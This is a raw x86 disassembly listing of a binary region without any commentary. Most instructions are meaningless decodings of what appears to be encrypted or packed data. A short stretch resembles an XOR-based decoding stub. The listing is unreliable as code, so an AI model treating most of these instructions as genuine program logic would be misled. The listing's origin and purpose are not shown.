  409a59:	cmp    eax,0x8069039f
  409a5e:	or     DWORD PTR [edi+0x3f15b153],esi
  409a64:	push   ds
  409a65:	(bad)  
  409a66:	scas   al,BYTE PTR es:[edi]
  409a67:	aad    0x3e
  409a69:	mov    ebx,0x6f5a6c1e
  409a6e:	imul   edi,DWORD PTR [eax],0x4ee5bef8
  409a74:	add    eax,0x4ca3c542
  409a79:	jns    0x409a86
  409a7b:	aas    
  409a7c:	jns    0x409a7d
  409a7e:	cmp    esi,eax
  409a80:	cmc    
  409a81:	or     al,0x80
  409a83:	pop    ebp
  409a84:	rcl    BYTE PTR [edi+0x3b],0xe0
  409a88:	scas   eax,DWORD PTR es:[edi]
  409a89:	hlt    
  409a8a:	xchg   ebp,eax
  409a8b:	stc    
  409a8c:	mov    al,0x10
  409a8e:	add    eax,0xe14ba5bb
  409a93:	stos   BYTE PTR es:[edi],al
  409a94:	mov    bl,0xc3
  409a96:	cli    
  409a97:	xor    eax,0xe25c00dc
  409a9c:	xor    BYTE PTR [esi],0xa2
  409a9f:	fisub  DWORD PTR [esi*4+0x10383883]
  409aa6:	clc    
  409aa7:	outs   dx,BYTE PTR ds:[esi]
  409aa8:	push   edi
  409aa9:	or     eax,0x53d02390
  409aae:	mov    DWORD PTR [ebp+0x77],edi
  409ab1:	das    
  409ab2:	xor    eax,0xd11ffea
  409ab7:	std    
  409ab8:	inc    edx
  409ab9:	xchg   edi,eax
  409aba:	fimul  DWORD PTR [edx+0x5b]
  409abd:	jns    0x409b3c
  409abf:	or     DWORD PTR ds:0x5bc7d062,eax
  409ac5:	(bad)  
  409ac6:	cmp    al,0x13
  409ac8:	add    DWORD PTR [eax],esi
  409aca:	lds    esp,FWORD PTR gs:[ecx-0x3a]
  409ace:	jno    0x409b1e
  409ad0:	mov    dh,0x36
  409ad2:	in     eax,0x87
  409ad4:	int    0xa8
  409ad6:	sub    DWORD PTR ds:0xa5a21156,0xffffffec
  409add:	xor    eax,0xa16dc212
  409ae2:	js     0x409b01
  409ae4:	sub    edi,DWORD PTR [ebx]
  409ae6:	or     edx,DWORD PTR [ebx]
  409ae8:	pop    edi
  409ae9:	add    BYTE PTR [edi],0xe2
  409aec:	jnp    0x409a8f
  409aee:	pusha  
  409aef:	enter  0x7c75,0x2d
  409af3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af4:	(bad)  
  409af5:	jae    0x409b27
  409af7:	cmp    ecx,eax
  409af9:	jae    0x409a99
  409afb:	sbb    al,BYTE PTR [edi+ebx*8-0xe4410d8]
  409b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b03:	add    dl,dh
  409b05:	and    al,0xbd
  409b07:	xchg   ebx,eax
  409b08:	(bad)  
  409b0a:	dec    ecx
  409b0c:	mul    esp
  409b0e:	add    al,BYTE PTR [eax-0x42]
  409b11:	sub    dh,ch
  409b13:	stos   BYTE PTR es:[edi],al
  409b14:	fisub  WORD PTR [esi]
  409b16:	shr    edi,1
  409b18:	jl     0x409b0f
  409b1a:	repnz sub DWORD PTR [edx+0x29],esi
  409b1e:	or     al,0x34
  409b20:	(bad)  
  409b21:	jne    0x409adf
  409b23:	nop
  409b24:	mov    dl,0x1a
  409b26:	test   DWORD PTR [eax],0x8e70e84f
  409b2c:	fsub   QWORD PTR [ebx]
  409b2e:	cmp    eax,0x5282db4f
  409b33:	push   edx
  409b34:	lods   al,BYTE PTR ds:[esi]
  409b35:	retf   
  409b36:	out    0xd,eax
  409b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b39:	stos   DWORD PTR es:[edi],eax
  409b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b3b:	fdiv   DWORD PTR [edi]
  409b3d:	or     ebx,DWORD PTR [edx]
  409b3f:	pop    esp
  409b40:	into   
  409b41:	adc    eax,DWORD PTR [esi+0x17]
  409b44:	jcxz   0x409bc1
  409b47:	in     al,0x47
  409b49:	jmp    0x409ba4
  409b4b:	add    DWORD PTR [edi-0x6c],0xfffffff7
  409b4f:	mov    ds:0x70dacea7,eax
  409b54:	xchg   esi,eax
  409b55:	and    DWORD PTR ds:0x2185c643,ebp
  409b5b:	pop    esp
  409b5c:	mov    dl,0x83
  409b5e:	in     al,0xf6
  409b60:	sub    ch,bh
  409b62:	add    al,0x26
  409b64:	mov    cl,0xea
  409b66:	or     BYTE PTR [eax+0x67],dh
  409b69:	jnp    0x409be1
  409b6b:	mov    DWORD PTR [ebp-0x40],eax
  409b6e:	sub    DWORD PTR ds:0x434683,edx
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x4345df
  409b7f:	or     DWORD PTR ds:0x43464f,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x43467f
  409b8f:	xor    DWORD PTR ds:0x434683,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x43466b
  409bb7:	mov    edi,DWORD PTR ds:0x434723
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	push   ebp
  409bd4:	cmp    DWORD PTR [edi],eax
  409bd6:	sbb    BYTE PTR [esi+0x707e7eea],cl
  409bdc:	jns    0x409c5c
  409bde:	jle    0x409b60
  409be0:	add    DWORD PTR [edx],ebp
  409be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409be4:	mov    ebx,0x666c4563
  409be9:	imul   ebx,ebp,0xa7703db3
  409bef:	pop    es
  409bf0:	cmp    cl,BYTE PTR [ebx]
  409bf2:	add    edx,esp
  409bf4:	jae    0x409b8e
  409bf6:	inc    esp
  409bf7:	int    0xfb
  409bf9:	scas   al,BYTE PTR es:[edi]
  409bfa:	dec    edx
  409bfb:	pop    ss
  409bfc:	bound  ebp,QWORD PTR [ecx-0x27214244]
  409c02:	shl    DWORD PTR [ecx-0x6af2b480],1
  409c08:	adc    al,0x80
  409c0a:	adc    ebx,edi
  409c0c:	sub    ebp,0x41
  409c0f:	ds push es
  409c11:	mov    ch,0x95
  409c13:	mov    ebp,0xba3a3508
  409c18:	cmp    ecx,ecx
  409c1a:	out    0x11,al
  409c1c:	cmp    dl,dl
  409c1e:	push   cs
  409c1f:	mov    dh,0xd
  409c21:	imul   ebx,DWORD PTR [ebx],0xe493623d
  409c27:	loopne 0x409c8c
  409c29:	inc    esi
  409c2a:	xor    al,0x17
  409c2c:	dec    ecx
  409c2d:	imul   edx,DWORD PTR [edi],0xe4fbe8fe
  409c33:	add    BYTE PTR [edi+0x39],cl
  409c36:	dec    edx
  409c37:	add    eax,0x737eeb5f
  409c3c:	fdiv   QWORD PTR [si]
  409c3f:	adc    al,0x5d
  409c41:	lock montmul (bad)
  409c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c44:	sbb    DWORD PTR [edi*1+0x1385b7c5],0x37
  409c4c:	les    edx,FWORD PTR [edi-0xe0ce072]
  409c52:	pop    edx
  409c53:	xchg   DWORD PTR [edi-0x6c],eax
  409c56:	sar    BYTE PTR [ecx+0x3e1205aa],cl
  409c5c:	fisubr WORD PTR [ebp-0x2f]
  409c5f:	push   ebp
  409c60:	adc    eax,0xe4fb01e9
  409c65:	add    al,0xa6
  409c67:	and    BYTE PTR [esp+ebx*8+0x6245ecdb],0xaf
  409c6f:	repnz arpl WORD PTR [ecx],bp
  409c72:	xchg   edx,eax
  409c73:	ins    BYTE PTR es:[edi],dx
  409c74:	stc    
  409c75:	xlat   BYTE PTR ds:[ebx]
  409c76:	mov    al,ds:0x75aba3c9
  409c7b:	dec    esi
  409c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c7d:	sub    al,0xf3
  409c7f:	enter  0xd96e,0x5d
  409c83:	dec    DWORD PTR [esi-0x16ee0427]
  409c89:	jne    0x409d06
  409c8b:	jb     0x409d00
  409c8d:	push   eax
  409c8e:	xor    BYTE PTR [edx+0x57],bh
  409c91:	in     eax,0x27
  409c93:	xor    eax,0x5a2cd56c
  409c98:	jmp    DWORD PTR [ebx-0x14da7a41]
  409c9e:	ret    0xead8
  409ca1:	imul   edx,DWORD PTR [edi-0x19ab76d3],0xecd614d8
  409cab:	mov    edx,0xc93dee95
  409cb0:	inc    eax
  409cb1:	jmp    0x4fdd:0xebb7f451
  409cb8:	push   cs
  409cb9:	xchg   esi,eax
  409cba:	daa    
  409cbb:	and    BYTE PTR [ebx*4+0x24ca029a],0x11
  409cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cc4:	cmp    eax,edi
  409cc6:	and    eax,0xbf0f88cc
  409ccb:	xor    eax,0x7164bdd0
  409cd0:	stos   BYTE PTR es:[edi],al
  409cd1:	inc    ecx
  409cd2:	mov    ds:0x99c65b68,eax
  409cd7:	fcom   DWORD PTR [edx+0x2071c28c]
  409cdd:	ror    ecx,cl
  409cdf:	daa    
  409ce0:	xchg   edx,eax
  409ce1:	add    DWORD PTR [edx-0x9],edx
  409ce4:	daa    
  409ce5:	lahf   
  409ce6:	jmp    0x2400:0xefa307a7
  409ced:	pop    ebx
  409cee:	or     BYTE PTR [ebx],ah
  409cf0:	clc    
  409cf1:	jae    0x409d1e
  409cf3:	cmp    ebp,DWORD PTR [ebx]
  409cf5:	mov    ebp,0xce182777
  409cfa:	es iret 
  409cfc:	inc    ecx
  409cfd:	(bad)  
  409cfe:	retf   
  409cff:	and    dl,cl
  409d01:	into   
  409d02:	aad    0x93
  409d04:	ss mov bl,0x72
  409d07:	sub    ecx,edx
  409d09:	les    ebp,FWORD PTR [esi-0x27]
  409d0c:	and    ecx,esp
  409d0e:	add    DWORD PTR [esi-0x16d1aa80],edi
  409d14:	repz adc al,0x75
  409d17:	push   edi
  409d18:	test   eax,0x6532025e
  409d1d:	sar    DWORD PTR [esi+0x8],cl
  409d20:	or     DWORD PTR [eax+0x7d],esi
  409d23:	mov    ebx,edx
  409d25:	or     DWORD PTR ds:0xacd633d6,0x288be915
  409d2f:	adc    eax,0xf37eb36d
  409d34:	popa   
  409d35:	push   0xb95b72f4
  409d3a:	pop    ecx
  409d3b:	dec    ebp
  409d3c:	in     al,dx
  409d3d:	jecxz  0x409cf7
  409d3f:	je     0x409d5f
  409d41:	rol    esp,cl
  409d43:	dec    ebp
  409d44:	cld    
  409d45:	mov    BYTE PTR [ecx-0x17],ch
  409d48:	or     DWORD PTR [edx-0x47],esi
  409d4b:	jg     0x409d8d
  409d4d:	push   0xffffffbc
  409d4f:	jg     0x409da7
  409d51:	sar    BYTE PTR [edi+0x3902f4de],0x1e
  409d58:	jne    0x409d51
  409d5a:	xchg   ebp,eax
  409d5b:	mov    ebp,0x58d177f0
  409d60:	inc    eax
  409d61:	dec    esi
  409d62:	or     eax,0x77fec40b
  409d67:	lods   eax,DWORD PTR ds:[esi]
  409d68:	jp     0x409d03
  409d6a:	scas   al,BYTE PTR es:[edi]
  409d6b:	int3   
  409d6c:	sar    BYTE PTR [ecx+ebp*8-0x26],1
  409d70:	jb     0x409dba
  409d72:	out    dx,al
  409d73:	or     eax,0x652431ea
  409d78:	(bad)  
  409d79:	(bad)  
  409d7a:	mov    edx,0x2602e417
  409d7f:	mov    ebx,0x70da7009
  409d84:	call   0xfed29312
  409d89:	sbb    dh,BYTE PTR [esi+0x6725aaa2]
  409d8f:	sbb    eax,DWORD PTR ds:0x6366acd8
  409d95:	sub    al,0xef
  409d97:	div    DWORD PTR [ebx+0x35e28462]
  409d9d:	mov    bh,0x5f
  409d9f:	dec    ebx
  409da0:	out    dx,al
  409da1:	ins    DWORD PTR es:[edi],dx
  409da2:	dec    edi
  409da3:	repnz ins DWORD PTR es:[edi],dx
  409da5:	bound  edx,QWORD PTR [ecx-0x68ad96d2]
  409dab:	fnstenv [ebx+0xc]
  409dae:	mov    eax,ds:0x93b46f32
  409db3:	shr    BYTE PTR [ebx],0xb0
  409db6:	popf   
  409db7:	inc    esi
  409db8:	mov    edi,DWORD PTR [ebp+ecx*1+0x52]
  409dbc:	sbb    eax,0xc5fd7687
  409dc1:	mov    edx,0x27dfb8f8
  409dc6:	and    DWORD PTR [edx+0x68],0xf1f14eca
  409dcd:	add    dl,BYTE PTR [esi-0x2d27e0a1]
  409dd3:	loope  0x409da6
  409dd5:	push   edx
  409dd6:	mov    eax,ds:0x175f71c9
  409ddb:	fiadd  WORD PTR [edx+esi*4+0x7f]
  409ddf:	mov    cl,0xe9
  409de1:	push   edi
  409de2:	aaa    
  409de3:	or     edi,DWORD PTR [ebp+0x1ee0e74e]
  409de9:	mov    ebp,0x11833a47
  409dee:	test   BYTE PTR [ebx],0x76
  409df1:	sbb    ebx,DWORD PTR [eax+0xa9438ad]
  409df7:	push   ebx
  409df8:	lock xchg esp,eax
  409dfa:	mov    ah,0x69
  409dfc:	jl     0x409e29
  409dfe:	pop    ecx
  409dff:	xor    al,0x68
  409e01:	jecxz  0x409e54
  409e03:	loope  0x409e6e
  409e05:	int    0x7c
  409e07:	sub    BYTE PTR [edi],bh
  409e09:	repnz mov al,0x72
  409e0c:	mov    esi,0x5d29ddc
  409e11:	fwait
  409e12:	push   ebx
  409e13:	adc    bl,BYTE PTR es:[eax]
  409e16:	mov    al,dh
  409e18:	sub    eax,0x24dbd582
  409e1d:	call   0xb169:0x521f84e8
  409e24:	enter  0x8909,0xc1
  409e28:	in     al,0x77
  409e2a:	mov    al,BYTE PTR [ebp-0x7e]
  409e2d:	pop    esp
  409e2e:	sbb    DWORD PTR [ecx+0x4e7af4be],edx
  409e34:	sub    esi,edi
  409e36:	fldenv [esi+0x5]
  409e39:	mov    eax,0x5916563d
  409e3e:	ja     0x409dc6
  409e40:	fbld   TBYTE PTR [edi-0x22]
  409e43:	push   edx
  409e44:	pop    eax
  409e45:	cmc    
  409e46:	test   dh,cl
  409e48:	sahf   
  409e49:	push   edx
  409e4a:	adc    DWORD PTR [esi],esp
  409e4c:	xchg   ebp,eax
  409e4d:	xor    edi,edx
  409e4f:	aas    
  409e50:	ins    DWORD PTR es:[edi],dx
  409e51:	(bad)  
  409e52:	fs inc ebp
  409e54:	fld    TBYTE PTR [ecx-0x52]
  409e57:	(bad)  
  409e58:	fcmovnb st,st(7)
  409e5a:	sub    ebx,ebp
  409e5c:	repnz or eax,0xa0f7fd98
  409e62:	and    DWORD PTR [esi-0x5c],esp
  409e65:	shl    BYTE PTR [eax+0xc11a2d4],1
  409e6b:	sbb    bh,BYTE PTR [esi+edx*4+0x52df4136]
  409e72:	and    al,0xf7
  409e74:	dec    ecx
  409e75:	scas   eax,DWORD PTR es:[edi]
  409e76:	pop    edi
  409e77:	jmp    0x409e79
  409e79:	fadd   DWORD PTR [esi]
  409e7b:	clc    
  409e7c:	jno    0x409e87
  409e7e:	xchg   edx,eax
  409e7f:	ret    0x60c3
  409e82:	(bad)  
  409e83:	push   ds
  409e84:	xor    ecx,DWORD PTR [edi]
  409e86:	sub    eax,0x166a421e
  409e8b:	adc    eax,0x7a0a2b03
  409e90:	stos   BYTE PTR es:[edi],al
  409e91:	outs   dx,BYTE PTR ds:[esi]
  409e92:	add    DWORD PTR [edi+0x38],ebp
  409e95:	xlat   BYTE PTR ds:[ebx]
  409e96:	inc    edx
  409e97:	mov    eax,ds:0xe99a9d9d
  409e9c:	inc    ebp
  409e9d:	stc    
  409e9e:	xchg   DWORD PTR [eax],ebx
  409ea0:	or     dl,BYTE PTR [ebx+0x8]
  409ea3:	xchg   ecx,eax
  409ea4:	mov    edx,DWORD PTR [eax-0x19]
  409ea7:	(bad)  
  409ea8:	jmp    0xf539:0xf5488dab
  409eaf:	mov    eax,ds:0xaba51663
  409eb4:	out    0xcb,eax
  409eb6:	push   0x93d689f0
  409ebb:	jno    0x409e6b
  409ebd:	xchg   esp,eax
  409ebe:	out    0x3e,eax
  409ec0:	dec    edx
  409ec1:	cdq    
  409ec2:	fwait
  409ec3:	pushf  
  409ec4:	pop    ecx
  409ec5:	jp     0x409e9f
  409ec7:	shr    BYTE PTR [edx-0x14de6568],1
  409ecd:	in     eax,0x8c
  409ecf:	mov    al,0x64
  409ed2:	es pop ebx
  409ed4:	mov    dl,BYTE PTR [eax-0x15d340ce]
  409eda:	push   ebx
  409edb:	sbb    dh,bl
  409edd:	push   eax
  409ede:	cmp    BYTE PTR [ebx+0x23],bl
  409ee1:	les    esi,FWORD PTR [eax+0x62]
  409ee4:	addr16 push eax
  409ee6:	retf   
  409ee7:	pinsrw mm0,WORD PTR [edx+0x5],0xe7
  409eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eed:	pop    edx
  409eee:	push   ebx
  409eef:	cli    
  409ef0:	in     eax,dx
  409ef1:	shr    DWORD PTR [edx],cl
  409ef3:	stos   BYTE PTR es:[edi],al
  409ef4:	mov    ebp,0x923d999a
  409ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409efa:	sti    
  409efb:	inc    ebp
  409efc:	and    al,0x90
  409efe:	ins    BYTE PTR es:[edi],dx
  409eff:	push   edx
  409f00:	inc    ecx
  409f01:	and    BYTE PTR [esi+edx*4],bh
  409f04:	sti    
  409f05:	cmc    
  409f06:	add    edx,edi
  409f08:	out    0x20,eax
  409f0a:	std    
  409f0b:	mov    edi,0x54a0dae3
  409f10:	mov    eax,ebx
  409f12:	out    dx,al
  409f13:	pop    eax
  409f14:	fdivr  DWORD PTR [ecx-0x45cde8b5]
  409f1a:	retf   
  409f1b:	jb     0x409f4a
  409f1d:	cmp    al,0xa3
  409f1f:	add    esi,DWORD PTR [esi-0x5876323]
  409f25:	cwde   
  409f26:	aam    0x3a
  409f28:	fcmovnb st,st(0)
  409f2a:	cdq    
  409f2b:	mov    ebx,edx
  409f2d:	sub    dh,BYTE PTR [eax]
  409f2f:	cwde   
  409f30:	retf   
  409f31:	cld    
  409f32:	sub    eax,0xab3262e6
  409f37:	inc    ebp
  409f38:	clc    
  409f39:	lahf   
  409f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f3b:	out    dx,eax
  409f3c:	pop    ds
  409f3d:	xor    edi,DWORD PTR [edi-0x31c7e8]
  409f43:	lods   al,BYTE PTR ds:[esi]
  409f44:	(bad)  
  409f45:	push   0xf9fcfd2e
  409f4a:	ret    
  409f4b:	jo     0x409efd
  409f4d:	int    0x3d
  409f4f:	pop    ss
  409f50:	xchg   esp,eax
  409f51:	or     eax,0x95d9bcc7
  409f56:	adc    eax,0xee4050cb
  409f5b:	(bad)  
  409f5c:	sub    BYTE PTR [esi-0x7f],ch
  409f5f:	pop    esp
  409f60:	xchg   esp,eax
  409f61:	ficomp WORD PTR [edi+0x4f9a295]
  409f67:	fisttp WORD PTR [esi+eax*2+0x44cdc1c0]
  409f6e:	adc    eax,0x93073462
  409f73:	stos   DWORD PTR es:[edi],eax
  409f74:	xchg   ebx,eax
  409f75:	cwde   
  409f76:	mov    edx,0x7ad718c3
  409f7b:	sbb    bl,BYTE PTR [edx-0x78fda498]
  409f81:	call   0x98fc:0x63e494f2
  409f88:	ja     0x409f16
  409f8a:	stos   DWORD PTR es:[edi],eax
  409f8b:	sub    BYTE PTR [edx-0x25fd6376],dh
  409f91:	xor    ebp,0x85e4628a
  409f97:	(bad)  
  409f98:	addr16 push 0xea96db87
  409f9e:	shl    DWORD PTR [edx],1
  409fa0:	jae    0x409f43
  409fa2:	shl    DWORD PTR [ebp-0x18],1
  409fa5:	in     al,0x3b
  409fa7:	retf   
  409fa8:	fs sti 
  409faa:	xchg   esp,eax
  409fab:	or     DWORD PTR [esp+eiz*4+0x5cf9b9f4],edi
  409fb2:	loope  0x40a016
  409fb4:	jb     0x409f65
  409fb6:	cmc    
  409fb7:	sbb    al,0x7e
  409fb9:	pop    esi
  409fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fbb:	cli    
  409fbc:	sbb    edx,DWORD PTR [edx]
  409fbe:	ins    DWORD PTR es:[edi],dx
  409fbf:	rcr    DWORD PTR [eax],0xaf
  409fc2:	xchg   edi,eax
  409fc3:	adc    DWORD PTR [ecx-0x6896f551],ecx
  409fc9:	add    bh,BYTE PTR [eax-0x1a]
  409fcc:	aad    0x9e
  409fce:	cmp    al,ch
  409fd0:	popa   
  409fd1:	lds    ecx,FWORD PTR [esi]
  409fd3:	int3   
  409fd4:	xor    al,0xad
  409fd6:	std    
  409fd7:	dec    eax
  409fd8:	mov    bh,0x45
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fld    DWORD PTR [ebx-0x7ffc55f4]
  409ff8:	idiv   BYTE PTR [esi+0x7e]
  409ffb:	jo     0x40a076
  409ffd:	jle    0x40a07d
  409fff:	cli    
  40a000:	mov    ebp,DWORD PTR [ebp+0x38fb94ea]
  40a006:	adc    edi,DWORD PTR [esi-0x1f]
  40a009:	ins    BYTE PTR es:[edi],dx
  40a00a:	ret    0xd90d
  40a00d:	in     eax,0xfe
  40a00f:	push   esi
  40a010:	xchg   esi,eax
  40a011:	mov    esp,0x87013d64
  40a016:	call   0x728407f9
  40a01b:	and    BYTE PTR [ecx-0x6b],0xa3
  40a01f:	sbb    eax,0x7c6a0c22
  40a024:	enter  0xf2b1,0x3d
  40a028:	popa   
  40a029:	ficom  DWORD PTR [edx]
  40a02b:	and    al,BYTE PTR ds:0xe96cf8f5
  40a031:	xchg   ebx,eax
  40a032:	sub    eax,0x5b557c5f
  40a037:	mov    ds:0x76c7dc04,eax
  40a03c:	xor    cl,BYTE PTR [esi+0x15]
  40a03f:	pop    edx
  40a040:	fild   QWORD PTR [esi+eax*8+0x6d]
  40a044:	lock inc eax
  40a046:	iret   
  40a047:	fisttp DWORD PTR [esi]
  40a049:	push   es
  40a04a:	call   0x588:0xfc6f4bab
  40a051:	ds push 0xa7950fb9
  40a057:	add    eax,0x9888c269
  40a05c:	repnz push 0xffffff90
  40a05f:	sub    dl,BYTE PTR [edi+0x73]
  40a062:	addr16 dec ebp
  40a064:	and    eax,0x11d1cc6e
  40a069:	lds    esi,FWORD PTR cs:[ecx-0xd]
  40a06d:	or     al,0xe1
  40a06f:	pop    esi
  40a070:	inc    ecx
  40a071:	cmp    DWORD PTR [esi],ebx
  40a073:	pusha  
  40a074:	push   eax
  40a075:	ds lahf 
  40a077:	stos   DWORD PTR es:[edi],eax
  40a078:	clc    
  40a079:	push   0x2b
  40a07b:	jae    0x40a01a
  40a07d:	add    al,0xf7
  40a07f:	sub    al,0x95
  40a081:	push   es
  40a082:	lahf   
  40a083:	or     ebx,ebp
  40a085:	popf   
  40a086:	sub    DWORD PTR [edx+0x16],edi
  40a089:	jmp    0xe841:0x1f926652
  40a090:	imul   eax,edi,0xf5950f9e
  40a096:	xchg   esi,eax
  40a097:	mov    bh,0xdd
  40a099:	cmp    eax,0xd720cf57
  40a09e:	je     0x40a03b
  40a0a0:	xor    dh,BYTE PTR [esi-0x79]
  40a0a3:	das    
  40a0a4:	arpl   WORD PTR [edx-0x20],sp
  40a0a7:	lahf   
  40a0a8:	sahf   
  40a0a9:	or     al,0xdb
  40a0ab:	jmp    0x40a07f
  40a0ad:	jmp    0x40a11c
  40a0af:	fist   WORD PTR [edi]
  40a0b1:	nop
  40a0b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0b3:	std    
  40a0b4:	sbb    al,BYTE PTR [ecx+0xf]
  40a0b7:	mov    eax,ds:0x7e242795
  40a0bc:	mov    edi,0xe8f1b419
  40a0c1:	inc    ebp
  40a0c2:	pushf  
  40a0c3:	pop    ss
  40a0c4:	mov    ss,edx
  40a0c6:	ins    BYTE PTR es:[edi],dx
  40a0c7:	or     ebx,DWORD PTR [edx+0x53]
  40a0ca:	dec    ebp
  40a0cb:	pop    ecx
  40a0cc:	mov    dh,0x70
  40a0ce:	fcom   DWORD PTR [eax-0x17fb7733]
  40a0d4:	inc    edi
  40a0d5:	int    0x74
  40a0d7:	or     dh,BYTE PTR [edi-0x57a67c9]
  40a0dd:	jae    0x40a156
  40a0df:	iret   
  40a0e0:	(bad)  
  40a0e1:	stc    
  40a0e2:	cmc    
  40a0e3:	lahf   
  40a0e4:	loopne 0x40a15f
  40a0e6:	mov    dl,0x2d
  40a0e8:	mov    eax,0xe4794500
  40a0ed:	mov    ds,WORD PTR [ebp+0x66]
  40a0f0:	xchg   ebx,eax
  40a0f1:	mov    esi,0xb95b814a
  40a0f6:	into   
  40a0f7:	cld    
  40a0f8:	and    edi,edx
  40a0fa:	inc    ecx
  40a0fb:	dec    esp
  40a0fc:	inc    esp
  40a0fd:	sbb    bl,BYTE PTR [eax]
  40a0ff:	mov    ah,0xcf
  40a101:	mov    esp,0x90e063de
  40a106:	fisub  DWORD PTR [ebx-0x67]
  40a109:	lods   eax,DWORD PTR ds:[esi]
  40a10a:	sar    DWORD PTR [edi],1
  40a10c:	jp     0x40a0d1
  40a10e:	cli    
  40a10f:	sub    BYTE PTR [esi+0x5a75ca47],bl
  40a115:	pop    eax
  40a116:	xchg   edx,eax
  40a117:	jae    0x40a109
  40a119:	pop    ecx
  40a11a:	fdivr  st,st(3)
  40a11c:	push   ss
  40a11d:	sbb    al,0x7c
  40a11f:	adc    eax,0xe09afd6e
  40a124:	mov    dh,0x5f
  40a126:	fstp   TBYTE PTR [edx-0x2377f55f]
  40a12c:	and    eax,0x27d562c0
  40a131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a132:	aad    0x4c
  40a134:	jbe    0x40a0c3
  40a136:	add    eax,0xd5304e04
  40a13b:	repz sub BYTE PTR ds:0x37b70577,cl
  40a142:	mov    DWORD PTR [edx-0x1f699ece],esi
  40a148:	enter  0x7424,0x91
  40a14c:	test   DWORD PTR [ebp+0xc01868a],edx
  40a152:	cmc    
  40a153:	add    ebx,DWORD PTR [ecx+0x56]
  40a156:	popf   
  40a157:	inc    esp
  40a158:	jmp    0xd1181a5b
  40a15d:	rcl    BYTE PTR [ebx-0x320788da],1
  40a163:	add    eax,0x26fc321f
  40a168:	mov    esp,0x2f2ebe64
  40a16d:	in     eax,0x84
  40a16f:	pop    ebx
  40a170:	std    
  40a171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a172:	and    esi,DWORD PTR [ebp+0x6205888d]
  40a178:	frstor [eax+0x37]
  40a17b:	sbb    al,0x5
  40a17d:	cmp    al,BYTE PTR [edi+0x68]
  40a180:	mov    dl,0x14
  40a182:	cwde   
  40a183:	xor    al,0xe8
  40a185:	inc    edx
  40a186:	cmc    
  40a187:	imul   esp,eax,0xffffffe0
  40a18a:	jl     0x40a13f
  40a18c:	mov    esp,0x10a0f82c
  40a191:	mov    esp,fs
  40a193:	jg     0x40a170
  40a195:	or     esi,DWORD PTR fs:[ebp-0x461c5e1c]
  40a19c:	and    DWORD PTR [ebp+edx*4+0x1806dabb],edi
  40a1a3:	jb     0x40a163
  40a1a5:	in     al,dx
  40a1a6:	lock pop edx
  40a1a8:	mov    edi,0xa8c584e2
  40a1ae:	sar    BYTE PTR [ecx+esi*4-0xc],0x60
  40a1b3:	pop    eax
  40a1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b5:	pusha  
  40a1b6:	jg     0x40a200
  40a1b8:	lds    ecx,FWORD PTR [ecx*2-0x4c29c413]
  40a1bf:	cmp    al,al
  40a1c1:	and    BYTE PTR [ebx+0x62],bh
  40a1c4:	sbb    bl,BYTE PTR [ebp-0x2c]
  40a1c7:	bound  ebx,QWORD PTR [ebx+0x46]
  40a1ca:	mov    ecx,DWORD PTR [ebp-0x7d]
  40a1cd:	es push ebp
  40a1cf:	fdiv   DWORD PTR [ebx-0x2d]
  40a1d2:	jmp    0x40a1a2
  40a1d4:	push   esp
  40a1d5:	mov    eax,ds:0x224a057e
  40a1da:	stos   DWORD PTR es:[edi],eax
  40a1db:	inc    ecx
  40a1dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1dd:	mov    ds:0x64f4c78a,eax
  40a1e2:	sub    eax,0xa61b31d0
  40a1e7:	jecxz  0x40a238
  40a1e9:	test   BYTE PTR [edx+ecx*1+0x6abae493],bh
  40a1f0:	jp     0x40a205
  40a1f2:	cmp    al,0xc3
  40a1f4:	call   0x769f:0x2cd44ca0
  40a1fb:	xchg   ecx,eax
  40a1fc:	lods   al,BYTE PTR ds:[esi]
  40a1fd:	sbb    DWORD PTR [ecx],esp
  40a1ff:	push   esp
  40a200:	and    ebp,DWORD PTR [edx-0x36751132]
  40a206:	jo     0x40a1d3
  40a208:	ficom  WORD PTR [edx+0x41d0a6b3]
  40a20e:	push   cs
  40a20f:	xor    BYTE PTR [ecx+0x57],bh
